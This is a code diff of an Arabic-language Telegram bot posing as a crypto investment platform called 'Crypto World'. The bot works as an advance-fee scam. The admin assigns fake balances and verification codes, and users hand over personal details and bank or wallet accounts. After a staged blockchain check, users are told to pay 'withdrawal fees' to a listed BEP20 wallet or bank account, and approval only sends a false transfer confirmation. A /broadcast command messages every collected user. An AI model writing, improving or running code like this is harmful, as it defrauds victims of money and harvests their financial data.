@@ -45,7 +45,7 @@ def load_data():
             "network": "BNB Smart Chain (BEP20)",
             "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
         },
-        "user_fees": {},  # الرسوم الخاصة لكل مستخدم عبر الـ ID
+        "user_fees": {},
         "all_users": []
     }
 
@@ -64,7 +64,6 @@ def save_data_to_file():
     except Exception as e:
         logger.error(f"خطأ في حفظ البيانات: {e}")
 
-# تحميل البيانات عند تشغيل البوت
 db = load_data()
 user_states = db.get("states", {})
 user_custom_data = db.get("custom_data", {})
@@ -78,7 +77,6 @@ withdraw_fee_info = db.get("fee_info", {
 user_specific_fees = db.get("user_fees", {})
 all_users_set = set(db.get("all_users", []))
 
-# تقدير عمر الحساب بناءً على الـ ID
 def estimate_account_age(user_id: int) -> str:
     if user_id < 10000000:
         return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
@@ -91,51 +89,32 @@ def estimate_account_age(user_id: int) -> str:
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر الأدمن للرسوم العامة: /setwithdrawfee
 async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
-
     args = context.args
     if len(args) < 4:
-        await update.message.reply_text(
-            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
-            "اكتب الأمر بهذا الشكل:\n"
-            "`/setwithdrawfee <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("⚠️ طريقة الاستخدام غير صحيحة!\n`/setwithdrawfee <المبلغ> <العملة> <الشبكة> <العنوان>`", parse_mode="Markdown")
         return
-
     withdraw_fee_info["amount"] = args[0]
     withdraw_fee_info["currency"] = args[1].upper()
     withdraw_fee_info["network"] = args[2]
     withdraw_fee_info["address"] = " ".join(args[3:])
     save_data_to_file()
+    await update.message.reply_text("✅ تم تحديث الرسوم العامة بنجاح!", parse_mode="Markdown")
 
-    await update.message.reply_text("✅ **تم تحديث الرسوم العامة بنجاح!**", parse_mode="Markdown")
-
-# أمر الأدمن لتخصيص رسوم مستخدم بالـ ID: /setuserfee
 async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
-
     args = context.args
     if len(args) < 5:
-        await update.message.reply_text(
-            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
-            "اكتب الأمر بهذا الشكل:\n"
-            "`/setuserfee <معرف_المستخدم> <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`\n\n"
-            "مثال:\n`/setuserfee 8968241467 2000 SAR الراجحي 260000010006080404601`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("⚠️ طريقة الاستخدام غير صحيحة!\n`/setuserfee <ID> <المبلغ> <العملة> <الشبكة> <العنوان>`", parse_mode="Markdown")
         return
-
     target_user_id = str(args[0].strip())
     amount = args[1].strip()
     currency = args[2].upper()
     network = args[3]
     address = " ".join(args[4:])
-
     user_specific_fees[target_user_id] = {
         "amount": amount,
         "currency": currency,
@@ -143,54 +122,38 @@ async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYP
         "address": address
     }
     save_data_to_file()
+    await update.message.reply_text(f"✅ تم تخصيص رسوم السحب للمستخدم `{target_user_id}` بنجاح!", parse_mode="Markdown")
 
-    await update.message.reply_text(
-        f"✅ **تم تخصيص رسوم السحب للمستخدم `{target_user_id}` بنجاح!**\n\n"
-        f"• المبلغ: `{amount} {currency}`\n"
-        f"• البنك / الشبكة: `{network}`\n"
-        f"• الحساب / العنوان:\n`{address}`",
-        parse_mode="Markdown"
-    )
-
-# أمر الإذاعة للجميع: /broadcast
 async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
-
     text_to_send = " ".join(context.args)
     if not text_to_send:
         await update.message.reply_text("⚠️ اكتب الرسالة بعد الأمر `/broadcast`", parse_mode="Markdown")
         return
-
     for uid in list(all_users_set):
         try:
             await context.bot.send_message(chat_id=int(uid), text=text_to_send, parse_mode="Markdown")
             await asyncio.sleep(0.05)
         except Exception as e:
             logger.error(f"فشل الإرسال للمستخدم {uid}: {e}")
-
     await update.message.reply_text("✅ تم إرسال الإذاعة بنجاح.", parse_mode="Markdown")
 
-# أمر تحديد رصيد وأكواد المستخدم: /setprofit
 async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
-
     args = context.args
     if len(args) < 3:
         await update.message.reply_text("⚠️ الاستخدام: `/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`", parse_mode="Markdown")
         return
-
     target_user_id = str(args[0].strip())
     amount = args[1].strip()
     code = args[2].strip()
-
     custom_profits[code] = {
         "amount": amount,
         "assigned_user_id": int(target_user_id)
     }
     save_data_to_file()
-
     await update.message.reply_text(f"✅ تم تخصيص رصيد `{amount} SAR` وكود التحقق `{code}` للمستخدم `{target_user_id}` بنجاح.", parse_mode="Markdown")
 
 async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -199,16 +162,13 @@ async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
     await update.message.reply_text(f"🔑 **الأكواد الفعّالة:**\n`{codes_str}`", parse_mode="Markdown")
 
-# أمر البدء الترحيبي النظيف
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
     user_states[user_id] = "waiting_for_subscription_text"
     all_users_set.add(user_id)
     save_data_to_file()
-    
     age_estimation = estimate_account_age(user.id)
-    
     welcome_msg = (
         f"🌟 أهلاً بك في منصة **عالم الكريبتو | Crypto World** 🌐\n"
         f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
@@ -217,23 +177,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• تقدير الحساب: {age_estimation}\n\n"
         f"الرجاء إرسال تفاصيل بياناتك صحيحة ليتم التعرف عليك في النظام وتفعيل حسابك."
     )
-    
     await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
 
-# معالجة الصور (الإيصالات)
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
     all_users_set.add(user_id)
     save_data_to_file()
     username = f"@{user.username}" if user.username else "بدون معرف"
-    
     if not update.message.photo:
         return
-
     photo = update.message.photo[-1]
     await update.message.reply_text("📸 **تم استلام صورة الوصل بنجاح!**\nجاري مراجعة وتأكيد العملية من قبل الإدارة.", parse_mode="Markdown")
-
     keyboard = [
         [
             InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
@@ -241,7 +196,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-
     admin_caption = (
         "📥 **إيصال دفع رسوم سحب جديد في (عالم الكريبتو)!**\n\n"
         f"👤 اسم المستثمر: {user.first_name}\n"
@@ -253,12 +207,10 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"فشل إرسال الإيصال للأدمن: {e}")
 
-# معالجة الرسائل النصية
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     if not msg or not msg.text:
         return
-
     user = update.effective_user
     user_id = str(user.id)
     all_users_set.add(user_id)
@@ -282,7 +234,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if current_state == "waiting_for_bank_account":
         user_states[user_id] = "completed"
         save_data_to_file()
-        
         keyboard = [
             [
                 InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
@@ -291,7 +242,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await msg.reply_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nأرسل تفاصيل حسابك أو محفظتك في رسالة هنا:", reply_markup=reply_markup, parse_mode="Markdown")
-        
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=f"🏦 **تم إدخال الحساب من المستخدم `{user.id}`:**\n{text}",
@@ -303,19 +253,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if text in custom_profits:
             code_info = custom_profits[text]
             assigned_id = code_info["assigned_user_id"]
-            
             if assigned_id is not None and assigned_id != int(user_id):
                 await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك.")
                 return
-
             profit_amount = code_info["amount"]
             user_states[user_id] = "viewing_balance"
             save_data_to_file()
-
             keyboard = [[InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             user_specific_data = user_custom_data.get(user_id, text)
-
             await msg.reply_text(
                 text=f"✅ **تم التحقق بنجاح!**\n\n💰 **رصيدك المتاح:** `{profit_amount} SAR`\n\nإليك بياناتك المسجلة:\n\n{user_specific_data}",
                 reply_markup=reply_markup,
@@ -325,11 +271,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.reply_text("❌ رقم التحقق غير صحيح.")
         return
 
-# معالجة الأزرار التفاعلية
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    
     data = query.data  
     user = query.from_user
     user_id = str(user.id)
@@ -340,18 +284,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user.id != ADMIN_ID:
             await query.answer("هذا الإجراء للأدمن فقط!", show_alert=True)
             return
-
         parts = data.split("_")
         action = parts[1]
         target_user_id = int(parts[2])
-
         if action == "approve":
             try:
                 await context.bot.send_message(chat_id=target_user_id, text="✅ **تهانينا! تم تأكيد السحب وتحويل المبلغ إلى حسابك بنجاح.**", parse_mode="Markdown")
             except:
                 pass
             await query.edit_message_caption(caption=query.message.caption + "\n\n✅ **[تمت الموافقة وتأكيد السحب]**", parse_mode="Markdown")
-
         elif action == "reject":
             try:
                 await context.bot.send_message(chat_id=target_user_id, text="❌ **عذراً، تم رفض العملية.** يرجى مراجعة الدعم.", parse_mode="Markdown")
@@ -374,12 +315,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id] = "completed"
         save_data_to_file()
         await query.edit_message_text("⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع البلوكشين...**\n\nالرجاء الانتظار (60 ثانية)...", parse_mode="Markdown")
-        
         await asyncio.sleep(60)
-
         keyboard = [[InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
-
         await query.edit_message_text(
             "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
             reply_markup=reply_markup,
@@ -388,7 +326,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "pay_fees":
         fee_data = user_specific_fees.get(user_id, withdraw_fee_info)
-        
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
             f"العملة: **{fee_data['currency']}**\n"
@@ -403,19 +340,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     if not TOKEN:
         raise ValueError("❌ خطأ: لم يتم تعيين التوكن!")
-        
     app = ApplicationBuilder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
-    app.add_handler(CommandHandler(apiUrl="broadcast", callback=broadcast_message) if "apiUrl" in globals() else CommandHandler("broadcast", broadcast_message))
+    app.add_handler(CommandHandler("broadcast", broadcast_message))
     app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))
     app.add_handler(CommandHandler("setuserfee", set_user_fee_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
-
     print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة...")
     app.run_polling()
 
